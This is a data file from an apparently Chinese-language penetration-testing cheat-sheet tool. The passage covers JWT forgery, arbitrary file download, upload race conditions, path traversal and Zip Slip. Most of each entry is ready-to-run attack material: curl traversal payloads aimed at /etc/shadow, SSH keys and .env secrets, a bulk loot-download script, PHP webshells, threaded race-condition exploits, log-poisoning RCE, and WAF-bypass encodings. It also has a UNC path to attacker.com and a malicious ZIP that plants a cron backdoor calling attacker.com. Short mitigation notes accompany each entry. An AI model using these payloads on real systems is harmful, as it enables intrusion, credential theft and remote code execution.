# 在attacker.com上部署包含攻击者公钥的JWKS文件

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key`,
            syntaxBreakdown: [
              { part: '# JWK内嵌密钥注入:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共12行', type: 'value' }
            ],
        description: '通过JWT Header中的jwk字段内嵌攻击者公钥或jku字段指向攻击者的JWKS端点，使服务端使用攻击者控制的密钥验证签名',
      },
      {
        title: '算法降级与嵌套令牌利用',
        command: `# 算法降级(RS256→HS256):
# 获取服务端公钥后用作HS256密钥:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim篡改+嵌套JWT:
# 在JWT payload中嵌入另一个JWT:
{"user":"admin","inner_token":"<另一个伪造的JWT>"}
# 某些系统会递归解析inner_token`,
            syntaxBreakdown: [
              { part: '# 算法降级(RS256→HS256):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共12行', type: 'value' }
            ],
        description: '利用RS256到HS256的算法混淆攻击(用公钥作对称密钥签名)，或在JWT Payload中嵌入伪造的内部JWT令牌触发递归解析漏洞',
      },
    ],
    tutorial: {
      overview: 'JWT(JSON Web Token)是现代Web应用和API中广泛使用的认证机制。JWT由Header.Payload.Signature三部分组成。常见攻击包括：Algorithm None(禁用签名)、密钥爆破、RS256→HS256算法混淆、KID参数注入等，均可导致认证绕过和权限提升。',
      vulnerability: '常见JWT安全缺陷：1) 服务端未验证alg字段(接受none) 2) 使用弱密钥(可被爆破) 3) 混淆对称/非对称算法(RS256→HS256) 4) kid字段未过滤(SQL注入/路径遍历) 5) 未验证exp过期时间 6) 敏感信息明文存储在payload中',
      exploitation: '利用流程：1) 拦截并解码JWT分析结构 2) 测试Algorithm None攻击 3) 尝试HS256密钥爆破 4) 获取公钥测试算法混淆 5) 测试kid参数注入 6) 篡改payload中的权限字段验证',
      mitigation: '1) 严格校验alg字段(白名单) 2) 使用强随机密钥(256+位) 3) RS256优于HS256 4) 对kid字段进行参数化查询 5) 始终验证exp和iat 6) 不在payload中存储敏感数据 7) 实施JWT吊销机制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'file-download',
    name: '任意文件下载',
    description: '利用文件下载功能中的路径控制缺陷下载服务器上的任意敏感文件',
    category: '文件漏洞',
    subCategory: '下载',
    tags: ['file-download', 'lfi', 'leak'],
    prerequisites: ['目标存在文件下载功能', '文件路径参数可控', '服务端未对路径进行严格过滤'],
    execution: [
      {
        title: '识别文件下载接口',
        command: `# 常见文件下载URL模式:
curl -v "http://target.com/download?file=report.pdf"
curl -v "http://target.com/download.php?path=uploads/doc.pdf"
curl -v "http://target.com/api/file/read?name=image.jpg"
curl -v "http://target.com/export?filename=data.csv"
curl -v "http://target.com/attachment/get/123"`,
        description: '识别目标的文件下载接口和参数名',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'file=report.pdf', explanation: '常见文件参数名:file,path,name,filename,doc', type: 'value' },
          { part: 'download.php', explanation: '典型文件下载脚本', type: 'value' },
        ]
      },
      {
        title: '路径遍历下载敏感文件',
        command: `# Linux敏感文件:
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/shadow"
curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows敏感文件:
curl "http://target.com/download?file=..\..\..\windows\win.ini"
curl "http://target.com/download?file=..\..\..\windows\system32\config\SAM"

# Web应用配置文件:
curl "http://target.com/download?file=../WEB-INF/web.xml"
curl "http://target.com/download?file=../application.properties"
curl "http://target.com/download?file=../.env"
curl "http://target.com/download?file=../config/database.yml"`,
        description: '利用路径遍历序列读取Web根目录以外的敏感系统和应用配置文件',
        platform: 'all',
        syntaxBreakdown: [
          { part: '../../../', explanation: '路径遍历序列，逐级向上跳出当前目录', type: 'value' },
          { part: '....//....//', explanation: '双写绕过—服务端删除../后仍然拼接出../', type: 'value' },
          { part: '%2e%2e/', explanation: 'URL编码绕过，%2e=%2e是.的编码', type: 'value' },
          { part: '..%252f', explanation: '双重URL编码绕过(%25是%的编码)', type: 'value' },
        ]
      },
      {
        title: '下载源码与数据库配置',
        command: `# Java应用关键文件:
curl "http://target.com/download?file=../../WEB-INF/web.xml" -o web.xml
curl "http://target.com/download?file=../../WEB-INF/classes/application.yml" -o app.yml
curl "http://target.com/download?file=../../WEB-INF/classes/db.properties" -o db.properties

# PHP应用:
curl "http://target.com/download?file=../../config.php" -o config.php
curl "http://target.com/download?file=../../.env" -o .env

# Node.js应用:
curl "http://target.com/download?file=../../package.json" -o package.json
curl "http://target.com/download?file=../../.env" -o .env

# 提取数据库凭证:
grep -iE "password|passwd|pwd|secret|key|db_|database|mysql|postgres" *.yml *.xml *.properties *.env 2>/dev/null`,
        description: '针对性下载应用源码和数据库配置文件获取数据库凭证',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'WEB-INF/web.xml', explanation: 'Java Web应用部署描述符，含Servlet配置', type: 'value' },
          { part: 'application.yml', explanation: 'Spring Boot主配置文件，常含数据库密码', type: 'value' },
          { part: '.env', explanation: '环境变量文件，常含各种密钥和密码', type: 'value' },
          { part: 'grep -iE', explanation: '不区分大小写的扩展正则搜索敏感关键词', type: 'command' },
        ]
      },
      {
        title: '自动化批量敏感文件探测',
        command: `#!/bin/bash
# 批量测试常见敏感文件路径
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "\${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "\${BASE}\${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "\${BASE}\${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done`,
        description: '自动化探测和下载多个常见敏感文件',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-w "%{http_code}:%{size_download}"', explanation: 'curl自定义输出格式获取状态码和大小', type: 'command' },
          { part: '/proc/self/environ', explanation: 'Linux进程环境变量文件，可能含密码', type: 'value' },
          { part: '/root/.ssh/id_rsa', explanation: 'SSH私钥文件，可直接登录服务器', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: '任意文件下载漏洞(Arbitrary File Download/Path Traversal)是Web应用中常见的高危漏洞。当文件下载功能的文件路径参数可被用户控制且服务端未进行严格过滤时，攻击者可以通过路径遍历(../)读取服务器上的任意文件，包括配置文件、源代码、数据库凭证、SSH私钥等敏感信息。',
      vulnerability: '文件下载接口直接将用户输入的文件名/路径拼接到文件系统路径中，未进行路径规范化、白名单过滤或沙箱限制，允许攻击者使用../序列跳出预期的下载目录。',
      exploitation: '利用流程：1) 识别文件下载接口和参数 2) 测试基本路径遍历(../) 3) 尝试编码绕过(URL编码/双重编码/Unicode) 4) 下载系统敏感文件验证漏洞 5) 有针对性地下载应用配置文件获取数据库凭证 6) 批量探测和下载敏感文件',
      mitigation: '1) 使用文件ID而非文件名作为参数 2) 白名单限制可下载的文件 3) 路径规范化后验证是否在允许目录内 4) 使用chroot或沙箱限制文件访问范围 5) 移除../等路径遍历序列 6) 禁止下载敏感目录下的文件',
      difficulty: 'beginner'
    },
      wafBypass: [
        { 
          title: '双重URL编码绕过', 
          command: `# 双重编码../
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=%252e%252e%255cetc%255cpasswd

# Unicode编码变体
?file=..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd

# 混合编码
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd`,
            syntaxBreakdown: [
              { part: '# 双重编码../', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用双重URL编码、Unicode超长编码等绕过WAF对路径遍历字符的检测' 
        },
        { 
          title: '参数名替换与路径操控', 
          command: `# 常见文件下载参数名Fuzz
?path=../../etc/passwd
?filepath=../../etc/passwd
?filename=../../etc/passwd
?doc=../../etc/passwd
?download=../../etc/passwd
?src=../../etc/passwd
?url=file:///etc/passwd

# 利用URL协议
?file=file:///etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php`,
            syntaxBreakdown: [
              { part: '# 常见文件下载参数名Fuzz', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '尝试不同的文件参数名和URL协议wrapper绕过WAF规则' 
        },
        { 
          title: '空字节截断与后缀绕过', 
          command: `# 空字节截断（PHP < 5.3.4）
?file=../../etc/passwd%00
?file=../../etc/passwd%00.jpg

# 路径截断（Windows长路径）
?file=../../etc/passwd..............................................................

# 点斜杠混淆
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=..\\..\\..\\etc\\passwd`,
            syntaxBreakdown: [
              { part: '# 空字节截断（PHP < 5.3.4）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用空字节截断、路径长度限制和特殊字符混淆绕过文件路径检查' 
        }
      ]
    },
  {
    id: 'file-competition',
    name: '条件竞争',
    description: '利用文件上传/处理过程中的竞态条件(Race Condition)，在安全检查与文件使用之间的时间窗口内执行恶意操作',
    category: '文件漏洞',
    subCategory: 'Race Condition',
    tags: ['race-condition', 'file-upload'],
    prerequisites: ['目标存在文件上传功能', '服务端"先上传后检查"的处理流程', '可以高并发访问上传的文件', '了解临时文件存储路径'],
    execution: [
      {
        title: '识别竞态条件窗口',
        command: `# 分析上传流程:
# 1. 文件上传到临时目录
# 2. 后端进行安全检查(文件类型/内容)
# 3. 如果检查通过则保留，否则删除
# 在步骤1和步骤3之间存在时间窗口

# 测试上传响应时间(判断是否有检查延迟)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done`,
        description: '分析文件上传的处理流程，识别安全检查前后的时间窗口',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'time curl', explanation: '计时上传请求的响应时间', type: 'command' },
          { part: '-F "file=@test.jpg"', explanation: '以multipart/form-data格式上传文件', type: 'parameter' },
        ]
      },
      {
        title: '竞态条件利用 - 上传与访问并发',
        command: `# 恶意PHP文件 (shell.php):
# <?php system($_GET["cmd"]); ?>

# 方法1: 使用两个终端并发操作
# 终端1 - 持续上传:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# 终端2 - 持续访问:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done`,
        description: '在上传后安全检查删除之前的时间窗口内访问执行恶意文件',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'while true; do ... done', explanation: '无限循环持续尝试', type: 'command' },
          { part: '&', explanation: '后台执行，不等待上一次上传完成', type: 'operator' },
          { part: 'grep -q "uid="', explanation: '静默检查是否成功执行了id命令', type: 'command' },
        ]
      },
      {
        title: 'Python并发竞态利用脚本',
        command: `import requests
import threading
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php?cmd=id"

def upload_loop():
    files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
    while not stop_event.is_set():
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def access_loop():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"[+] RCE! Response: {r.text[:200]}")
                stop_event.set()
                return
        except: pass

stop_event = threading.Event()
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=upload_loop))
for _ in range(20):
    threads.append(threading.Thread(target=access_loop))
for t in threads: t.start()
time.sleep(60)
stop_event.set()
for t in threads: t.join()`,
        description: '多线程并发上传与访问，提高竞态条件利用成功率',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'threading.Thread', explanation: '创建并发线程', type: 'command' },
          { part: 'stop_event', explanation: '线程间同步信号，成功后停止所有线程', type: 'variable' },
          { part: '"image/jpeg"', explanation: '伪造MIME类型绕过前端检查', type: 'value' },
        ]
      },
      {
        title: '.htaccess竞态写入',
        command: `# 如果可以上传.htaccess文件(即使会被删除):
# .htaccess内容:
AddType application/x-httpd-php .jpg

# 竞态利用:
# 1. 先正常上传一个含PHP代码的.jpg文件
curl -F "file=@shell.jpg" "http://target.com/upload"

# 2. 在.htaccess存在的时间窗口内访问.jpg
while true; do
  curl -s -F "file=@.htaccess" "http://target.com/upload" &
  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done`,
        description: '利用.htaccess的竞态上传使Apache将图片文件按PHP解析执行',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'AddType application/x-httpd-php .jpg', explanation: '让Apache将.jpg文件作为PHP执行', type: 'value' },
          { part: '.htaccess', explanation: 'Apache目录级配置文件', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: '条件竞争(Race Condition)漏洞发生在文件上传后安全检查(删除)前的时间窗口。服务端通常先将文件保存到临时目录，再进行安全检查(如文件类型、内容扫描)，检查不通过则删除。在保存和删除之间存在毫秒级时间窗口，攻击者通过高并发在该窗口内访问恶意文件即可实现RCE。',
      vulnerability: '服务端采用"先保存后检查"的文件处理流程，且临时文件存储在Web可访问的目录中，攻击者可以在安全检查完成前通过URL直接访问该文件。',
      exploitation: '利用流程：1) 分析上传流程和响应时间 2) 确定临时文件存储路径 3) 准备恶意文件(webshell) 4) 多线程并发上传+访问 5) 在时间窗口内成功执行恶意代码',
      mitigation: '1) 将临时文件存储在Web不可访问的目录 2) 使用随机文件名 3) 先检查后保存(先保存到非Web目录检查通过后再移动) 4) 限制上传目录的执行权限 5) 使用文件锁确保原子操作',
      difficulty: 'advanced'
    },
      wafBypass: [
        { 
          title: '并发上传竞态利用', 
          command: `# Python并发竞态上传
import threading, requests

def upload_shell():
    files = {'file': ('test.php', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

def access_shell():
    r = requests.get('http://target/uploads/test.php')
    if 'security_check' in r.text:
        print('[+] Race won!')

for i in range(100):
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=access_shell)
    t1.start(); t2.start()`,
            syntaxBreakdown: [
              { part: '# Python并发竞态上传', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
          description: '通过大量并发请求在文件检查与删除之间的时间窗口访问已上传的文件' 
        },
        { 
          title: '.htaccess竞态覆盖', 
          command: `# 竞态条件上传.htaccess
import threading, requests

def upload_htaccess():
    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}
    requests.post('http://target/upload', files=files)

def upload_payload():
    files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

for i in range(50):
    t1 = threading.Thread(target=upload_htaccess)
    t2 = threading.Thread(target=upload_payload)
    t1.start(); t2.start()`,
            syntaxBreakdown: [
              { part: '# 竞态条件上传.htaccess', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共12行', type: 'value' }
            ],
          description: '利用竞态条件在检查间隙写入.htaccess使图片文件被解析为PHP' 
        },
        { 
          title: '分块上传时间窗口', 
          command: `# 利用分块传输延长上传时间窗口
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\\r\\n"
    "Host: target\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "Content-Type: multipart/form-data; boundary=abc\\r\\n\\r\\n"
)
sock.send(headers.encode())

# 缓慢发送分块数据，延长文件存在时间
chunks = ["5\\r\\nhello\\r\\n", "5\\r\\nworld\\r\\n", "0\\r\\n\\r\\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)`,
          description: '通过分块传输编码（chunked）延长服务器处理时间，增大竞态利用窗口',
          syntaxBreakdown: [
            { part: '#', explanation: '注释标记', type: 'operator' },
            { part: '利用分块传输延长上传时间窗口', explanation: '关键参数', type: 'value' }
          ]
        }
      ]
    },
  {
    id: 'file-traversal',
    name: '路径遍历',
    description: '利用路径遍历(../)序列突破文件访问的目录限制，读取或写入Web根目录以外的任意文件',
    category: '文件漏洞',
    subCategory: 'Traversal',
    tags: ['traversal', 'file'],
    prerequisites: ['目标存在文件读取/包含功能', '文件路径参数可控', '服务端路径过滤不严格'],
    execution: [
      {
        title: '基础路径遍历测试',
        command: `# 基础遍历:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# 测试遍历深度(通常3-10层足够到根目录):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=\${traversal}etc/passwd")
  echo "Depth $i: $resp"
done`,
        description: '测试基本路径遍历和所需的目录跳转深度',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '../../../../', explanation: '向上跳转4级目录', type: 'value' },
          { part: 'printf "../%.0s"', explanation: '生成指定数量的../序列', type: 'command' },
        ]
      },
      {
        title: '编码绕过路径过滤',
        command: `# URL编码:
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# 双重URL编码:
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd"

# Unicode编码:
curl "http://target.com/file?path=..%c0%afetc/passwd"
curl "http://target.com/file?path=..%ef%bc%8fetc/passwd"

# 空字节截断(PHP<5.3.4):
curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"

# 双写绕过(服务端删除../一次):
curl "http://target.com/file?path=....//....//....//etc/passwd"

# 反斜杠(Windows):
curl "http://target.com/file?path=..\..\..\windows\win.ini"

# 混合斜杠:
curl "http://target.com/file?path=..\/../..\/../etc/passwd"`,
        description: '使用多种编码方式绕过路径遍历的过滤机制',
        platform: 'all',
        syntaxBreakdown: [
          { part: '%2e%2e%2f', explanation: '../的URL编码形式', type: 'value' },
          { part: '%252e%252e%252f', explanation: '../的双重URL编码(%25是%的编码)', type: 'value' },
          { part: '%c0%af', explanation: '/的Unicode过长编码形式(UTF-8)', type: 'value' },
          { part: '%00', explanation: '空字节截断后面的文件扩展名限制', type: 'value' },
          { part: '....//', explanation: '双写../——服务端删除一次../后剩余仍是../', type: 'value' },
        ]
      },
      {
        title: 'Windows特有路径遍历',
        command: `# UNC路径(可能触发SMB认证):
curl "http://target.com/file?path=\\attacker.com\share\test"

# Windows敏感文件:
curl "http://target.com/file?path=C:\Windows\win.ini"
curl "http://target.com/file?path=C:\Windows\System32\config\SAM"
curl "http://target.com/file?path=C:\inetpub\wwwroot\web.config"
curl "http://target.com/file?path=C:\Users\Administrator\.ssh\id_rsa"

# IIS短文件名枚举:
curl -v "http://target.com/file?path=C:\inetpub\wwwroot\WEB~1.CON"`,
        description: 'Windows环境下的特有路径遍历手法和敏感文件',
        platform: 'windows',
        syntaxBreakdown: [
          { part: '\\attacker.com\share', explanation: 'UNC路径可触发SMB连接泄露NTLM哈希', type: 'value' },
          { part: 'web.config', explanation: 'IIS配置文件，可能含数据库连接字符串', type: 'value' },
          { part: 'WEB~1.CON', explanation: '8.3短文件名格式用于枚举文件', type: 'value' },
        ]
      },
      {
        title: 'LFI到RCE升级',
        command: `# 1. 日志文件包含(Log Poisoning):
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"
curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ包含:
curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system(\$_GET['c']); ?>"

# 3. PHP Session文件包含:
# 先在session中写入payload(如用户名字段)
# 然后包含session文件:
curl "http://target.com/file?path=../../../tmp/sess_SESSION_ID"

# 4. PHP Filter读取源码:
curl "http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php"`,
        description: '将文件包含(LFI)升级为远程代码执行(RCE)',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-A "<?php system() ?>"', explanation: 'User-Agent注入PHP代码写入access.log', type: 'command' },
          { part: '/proc/self/environ', explanation: '包含HTTP请求头信息的进程环境变量', type: 'value' },
          { part: 'php://filter/convert.base64-encode', explanation: 'PHP流包装器将文件内容Base64编码输出', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: '路径遍历(Path Traversal/Directory Traversal)是Web应用中最常见的文件系统类漏洞。攻击者通过在文件路径参数中注入../序列或其编码变体，跳出应用预设的文件目录，读取(LFI)甚至写入服务器上的任意文件。结合日志注入等技术可以将LFI升级为RCE。',
      vulnerability: '应用在处理文件路径时，直接将用户输入拼接到文件系统路径中，且未进行路径规范化(canonicalization)和目录限制验证。',
      exploitation: '利用流程：1) 识别文件操作接口 2) 测试基本../遍历 3) 尝试编码绕过(URL编码/双重编码/Unicode) 4) 读取敏感系统文件 5) 尝试LFI→RCE升级(日志投毒/Session包含/PHP Filter)',
      mitigation: '1) 使用文件ID映射代替直接路径 2) 路径规范化后验证是否在白名单目录内 3) chroot限制文件访问范围 4) 禁用../序列及其各种编码形式 5) 最小权限运行应用进程',
      difficulty: 'beginner'
    },
      wafBypass: [
        { 
          title: '编码绕过路径过滤', 
          command: `# 双重URL编码
..%252f..%252f..%252fetc%252fpasswd

# Unicode/UTF-8超长编码
..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd

# 16位Unicode编码
..%u002f..%u002fetc/passwd
..%u2215..%u2215etc/passwd

# URL编码混合
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd`,
            syntaxBreakdown: [
              { part: '# 双重URL编码', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
          description: '通过双重URL编码、Unicode超长编码、UTF-8非标准编码绕过WAF的路径检测规则' 
        },
        { 
          title: '路径规范化差异利用', 
          command: `# 反斜杠替代（IIS/Windows）
..\\..\\..\\etc\\passwd
..\\\\..\\\\..\\\\windows\\\\win.ini

# 点斜杠变体
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd

# Java/Tomcat特殊处理
/..;/..;/..;/etc/passwd
/.;/../.;/../etc/passwd

# Nginx路径折叠
/static/../../../etc/passwd
/images/..%2f..%2f..%2fetc/passwd`,
            syntaxBreakdown: [
              { part: '# 反斜杠替代（IIS/Windows）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
          description: '利用不同中间件（IIS/Apache/Nginx/Tomcat）对路径解析的差异绕过安全限制' 
        },
        { 
          title: '空字节与路径截断绕过', 
          command: `# 空字节截断
../../etc/passwd%00.png
../../etc/passwd\\x00.jpg

# Windows短文件名
..\\..\\..\\WINDOW~1\\system32\\drivers\\etc\\hosts

# 超长路径截断（PHP < 5.3）
../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

# 点空格点截断（Windows）
../../windows/win.ini. . .`,
            syntaxBreakdown: [
              { part: '# 空字节截断', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
          description: '利用空字节注入、文件系统路径长度限制和Windows特殊文件名处理机制绕过' 
        }
      ]
    },
  {
    id: 'file-zip-slip',
    name: 'Zip Slip',
    description: '利用恶意构造的压缩包文件(ZIP/TAR)中的路径遍历实现任意文件写入，覆盖服务器上的关键文件或写入Webshell',
    category: '文件漏洞',
    subCategory: 'Zip',
    tags: ['zip-slip', 'file', 'rce'],
    prerequisites: ['目标存在ZIP/TAR文件上传并自动解压功能', '解压库未对文件名中的路径遍历进行过滤', '了解Web根目录或其他关键目录的路径'],
    execution: [
      {
        title: '探测ZIP上传和解压功能',
        command: `# 常见的ZIP上传解压场景:
# - 批量文件上传(模板/资源导入)
# - 插件/主题安装(WordPress/Discuz)
# - 备份恢复功能
# - 文档处理(DOCX/XLSX本质是ZIP)

# 测试正常ZIP上传:
echo "test" > test.txt
zip test.zip test.txt
curl -F "file=@test.zip" "http://target.com/upload/batch"

# 确认解压后文件的存储路径:
curl "http://target.com/uploads/test.txt"`,
        description: '识别目标的ZIP上传解压功能和文件存储路径',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'zip test.zip test.txt', explanation: '创建正常的ZIP压缩包', type: 'command' },
        ]
      },
      {
        title: '构造Zip Slip恶意压缩包',
        command: `# Python脚本创建恶意ZIP:
import zipfile
import os

# 目标：写入webshell到web根目录
with zipfile.ZipFile("evil.zip", "w") as zf:
    # 正常文件(伪装)
    zf.writestr("readme.txt", "Normal file")
    # 恶意文件(路径遍历)
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
    # 或覆盖配置文件:
    zf.writestr("../../../../../../etc/cron.d/backdoor",
                "* * * * * root curl http://attacker.com/callback")

print("[+] evil.zip created")
print("Files in ZIP:")
with zipfile.ZipFile("evil.zip", "r") as zf:
    for info in zf.infolist():
        print(f"  {info.filename} ({info.file_size} bytes)")`,
        description: '使用Python创建包含路径遍历文件名的恶意ZIP压缩包',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'zipfile.ZipFile', explanation: 'Python标准库的ZIP操作模块', type: 'command' },
          { part: '../../../var/www/html/', explanation: '文件名中的路径遍历，解压时跳出目标目录', type: 'value' },
          { part: 'zf.writestr()', explanation: '直接将字符串内容以指定文件名写入ZIP', type: 'command' },
        ]
      },
      {
        title: '上传并验证Zip Slip',
        command: `# 上传恶意ZIP
curl -F "file=@evil.zip" "http://target.com/upload/batch"

# 验证webshell写入成功
curl "http://target.com/test_shell.php?cmd=id"
curl "http://target.com/test_shell.php?cmd=whoami"

# 如果目标是Java应用(WAR包):
# 构造恶意WAR/JAR包(本质也是ZIP):
jar cf evil.war -C webshell/ .
# 或修改文件名为../../../webapps/ROOT/shell.jsp`,
        description: '上传恶意ZIP并验证是否成功写入Webshell',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'curl -F "file=@evil.zip"', explanation: '上传构造的恶意ZIP文件', type: 'command' },
          { part: 'test_shell.php?cmd=id', explanation: '验证写入的Webshell是否可执行', type: 'value' },
        ]
      },
      {
        title: 'TAR包Zip Slip变体',
        command: `# 构造恶意TAR包:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # 添加恶意文件
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# 使用符号链接攻击:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # 创建指向/etc/passwd的符号链接
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # 然后通过"link_to_passwd"覆盖目标文件
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))`,
        description: '使用TAR包实现Zip Slip，包括符号链接攻击变体',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'tarfile.open("w:gz")', explanation: '创建gzip压缩的TAR包', type: 'command' },
          { part: 'tarfile.SYMTYPE', explanation: '创建TAR中的符号链接条目', type: 'value' },
          { part: 'info.linkname', explanation: '符号链接指向的目标路径', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'Zip Slip是一种利用压缩包(ZIP/TAR/JAR/WAR等)中文件名的路径遍历序列(../)实现任意文件写入的漏洞。当服务端自动解压用户上传的压缩包时，如果未对压缩包内的文件名进行路径安全检查，恶意文件会被解压到预期目录之外的位置，攻击者可以覆盖关键配置文件或写入Webshell实现RCE。',
      vulnerability: '服务端在解压ZIP/TAR文件时，直接使用压缩包内记录的文件名作为解压路径，未验证文件名是否包含../路径遍历序列，也未检查解压后的绝对路径是否仍在预期目录内。',
      exploitation: '利用流程：1) 识别ZIP上传解压功能 2) 确定Web根目录或关键目录路径 3) 构造包含路径遍历文件名的恶意ZIP 4) 上传恶意ZIP触发解压 5) 访问写入的Webshell验证RCE',
      mitigation: '1) 解压前验证每个文件的目标路径是否在预期目录内 2) 使用Path.normalize()规范化路径后检查 3) 拒绝包含../的文件名 4) 在沙箱/临时目录中解压后检查 5) 限制解压目录的执行权限',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: '替代压缩格式绕过', 
          command: `# 使用tar格式（可能未被检测）
import tarfile, io
with tarfile.open('test.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../../tmp/test.txt')
    info.size = 14
    tar.addfile(info, io.BytesIO(b'security_check'))

# 使用7z格式
7z a test.7z ../../../tmp/test.txt

# 使用cpio格式
echo "../../../tmp/test.txt" | cpio -o > test.cpio`,
            syntaxBreakdown: [
              { part: '# 使用tar格式（可能未被检测）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共10行', type: 'value' }
            ],
